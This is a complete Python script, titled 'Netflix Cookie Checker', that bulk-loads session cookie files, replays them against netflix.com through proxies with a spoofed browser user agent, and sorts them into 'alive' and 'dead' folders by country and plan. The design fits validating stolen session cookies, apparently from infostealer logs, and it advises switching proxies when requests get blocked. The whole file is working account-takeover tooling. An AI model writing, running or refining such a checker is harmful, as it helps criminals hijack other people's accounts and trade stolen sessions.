#!/usr/bin/env python3
import argparse, re, sys, time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
import requests

SCRIPT_DIR = Path(__file__).resolve().parent
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
REQ = {"User-Agent": UA, "Accept-Language": "en-US,en;q=0.9", "Accept": "text/html,application/xhtml+xml"}
ALIVE_MARK = ('"profiles"', "profile-avatar", '"profileName"', '"memberStatus"')
CC_RE = re.compile(r"^\d+_([A-Z]{2})_")
STATUS_MAP = {"a": "alive", "d": "dead", "b": "blocked", "e": "error"}


def load_cookies(path):
    try:
        text = path.read_text(encoding="utf-8", errors="replace")
    except OSError as e:
        return None, str(e)
    jar = []
    for line in text.splitlines():
        s = line.strip()
        if not s or s.startswith("#"):
            continue
        f = [x.strip() for x in s.split("\t")]
        if len(f) < 7:
            continue
        jar.append({"name": f[5], "value": "".join(f[6:]), "domain": f[0],
                    "path": f[2], "secure": f[3].upper() == "TRUE"})
    return jar, None


def build_session(cookies, proxy=None):
    s = requests.Session()
    s.headers.update(REQ)
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    for c in cookies:
        s.cookies.set(c["name"], c["value"], domain=c["domain"], path=c["path"], secure=c["secure"])
    return s


def grab(pat, text):
    m = re.search(pat, text)
    return m.group(1) if m else ""


def check_one(path, retries=2, timeout=25, proxy=None):
    cookies, err = load_cookies(path)
    rec = {"source": path.name, "path": str(path), "verdict": "", "detail": "",
           "profiles": 0, "country": "", "plan": "", "uuid": ""}
    if err:
        rec.update(verdict="error", detail="read fail")
        return rec
    if not cookies:
        rec.update(verdict="dead", detail="no cookie")
        return rec
    if not {c["name"] for c in cookies} & {"NetflixId", "SecureNetflixId"}:
        rec.update(verdict="dead", detail="missing ID cookie")
        return rec

    m = re.search(r"([A-Z0-9]{20,})", path.name)
    if m:
        rec["uuid"] = m.group(1)[:32]

    for attempt in range(retries + 1):
        try:
            r = build_session(cookies, proxy).get(
                "https://www.netflix.com/browse", timeout=timeout, allow_redirects=False)
        except requests.RequestException as e:
            rec.update(verdict="error", detail=type(e).__name__)
            time.sleep(1.5 * (attempt + 1))
            continue
        if r.status_code in (429, 403):
            rec.update(verdict="blocked", detail="HTTP " + str(r.status_code))
            time.sleep(2.5 * (attempt + 1))
            continue
        if r.status_code in (301, 302, 303, 307, 308):
            loc = r.headers.get("Location", "")
            rec.update(verdict="dead",
                       detail="redirect to login" if "/login" in loc or "signup" in loc else "redirect")
            return rec
        if r.status_code >= 500:
            rec.update(verdict="error", detail="HTTP " + str(r.status_code))
            time.sleep(1.5 * (attempt + 1))
            continue
        if r.status_code != 200:
            rec.update(verdict="dead", detail="HTTP " + str(r.status_code))
            return rec
        body = r.text
        if not any(m in body for m in ALIVE_MARK):
            rec.update(verdict="dead", detail="no login mark")
            return rec
        guids = set(re.findall(r'"profileGuid":"([A-Z0-9]{6,})"', body))
        names = re.findall(r'"profileName":"([^"]{1,40})"', body)
        rec.update(
            verdict="alive", detail="ok",
            profiles=len(guids) or len(names),
            country=grab(r'"countryOfSignup":"([A-Z]{2})"', body),
            plan=grab(r'"memberPlan":"([^"]{1,20})"', body) or grab(r'"planName":"([^"]{1,20})"', body),
        )
        return rec
    if not rec["verdict"]:
        rec["verdict"] = "error"
    return rec


def collect_files(targets):
    files, seen = [], set()
    for raw in targets:
        p = Path(raw)
        if not p.exists():
            print("[warn] not found: " + raw, file=sys.stderr)
            continue
        found = [p.resolve()] if p.is_file() else sorted(p.rglob("*.txt"))
        if p.is_file() and p.suffix.lower() != ".txt":
            print("[warn] skip non-txt: " + raw, file=sys.stderr)
            continue
        if not found:
            print("[warn] no .txt: " + raw, file=sys.stderr)
        for f in found:
            if f not in seen and f.suffix.lower() == ".txt":
                seen.add(f)
                files.append(f)
    return files


def parse_status(value):
    chars = re.findall(r"[adbe]", (value or "a").lower())
    return {STATUS_MAP[c] for c in chars} if chars else {"alive"}


def safe(s, fallback="XX"):
    s = re.sub(r'[\\/:*?"<>|\s]', "_", (s or "").strip())
    return s[:40] if s else fallback


def make_filename(rec):
    status = rec["verdict"]
    country = safe(rec["country"] or (CC_RE.match(rec["source"]).group(1) if CC_RE.match(rec["source"]) else ""), "XX")
    plan = safe(rec["plan"], "Unknown") if status == "alive" else "-"
    uid = safe(rec["uuid"], "noUUID")
    return f"{status}_{country}_{plan}_{uid}.txt"


def main():
    ap = argparse.ArgumentParser(description="Netflix Cookie Checker")
    ap.add_argument("targets", nargs="+", help="file or folder")
    ap.add_argument("-w", type=int, default=8, help="workers")
    ap.add_argument("-t", type=int, default=25, help="timeout sec")
    ap.add_argument("-p", default=None, help="proxy url")
    ap.add_argument("-r", default="a", help="status: a/d/b/e")
    ap.add_argument("--retries", type=int, default=2, help=argparse.SUPPRESS)
    args = ap.parse_args()

    want = parse_status(args.r)
    files = collect_files(args.targets)
    if not files:
        sys.exit("no .txt files")

    out_root = SCRIPT_DIR / "result"
    out_root.mkdir(parents=True, exist_ok=True)

    print("=" * 50)
    print("  Netflix Cookie Checker")
    print("=" * 50)
    print(f"  Files   : {len(files)}")
    print(f"  Workers : {args.w}")
    print(f"  Output  : {out_root}")
    print(f"  Export  : {', '.join(sorted(want))}")
    print("=" * 50)
    print()

    results, done = [], 0

    def _check(p):
        return check_one(p, retries=args.retries, timeout=args.t, proxy=args.p)

    with ThreadPoolExecutor(max_workers=args.w) as ex:
        futs = {ex.submit(_check, p): p for p in files}
        for fut in as_completed(futs):
            rec = fut.result()
            results.append(rec)
            done += 1
            mark = {"alive": "[OK] ", "dead": "[--] ", "blocked": "[BLK]", "error": "[ERR]"}.get(rec["verdict"], "[??] ")
            extra = ""
            if rec["verdict"] == "alive":
                extra = f"  {rec['profiles']}P  {rec['country']}  {rec['plan']}"
            print(f"  {done:>3}/{len(files)}  {mark}  {rec['source'][:40]:<40}  {rec['detail']}{extra}")

    moved = {s: 0 for s in want}
    for r in results:
        v = r["verdict"]
        if v not in want:
            continue
        m = CC_RE.match(r["source"])
        cc = safe(m.group(1) if m else (r["country"] or "XX"))
        dest = out_root / v / cc
        dest.mkdir(parents=True, exist_ok=True)
        new_name = make_filename(r)
        target = dest / new_name
        n = 1
        while target.exists():
            stem = new_name.rsplit(".", 1)[0]
            target = dest / f"{stem}_{n}.txt"
            n += 1
        try:
            target.write_text(Path(r["path"]).read_text(encoding="utf-8", errors="replace"), encoding="utf-8")
            moved[v] += 1
        except OSError as e:
            print(f"  [warn] copy fail: {e}", file=sys.stderr)

    cnt = {}
    for r in results:
        cnt[r["verdict"]] = cnt.get(r["verdict"], 0) + 1

    print()
    print("=" * 50)
    print("  SUMMARY")
    print("=" * 50)
    for k in ("alive", "dead", "blocked", "error"):
        print(f"  {k:<10}: {cnt.get(k, 0)}")
    print("-" * 50)
    print("  Saved files:")
    for s in ("alive", "dead", "blocked", "error"):
        if s in moved and moved[s]:
            print(f"    {s:<10}: {moved[s]:>4}  ->  result/{s}/")
    if cnt.get("blocked"):
        print()
        print("  tip: many blocked -> try -w 4 or change proxy")
    print("=" * 50)


if __name__ == "__main__":
    main()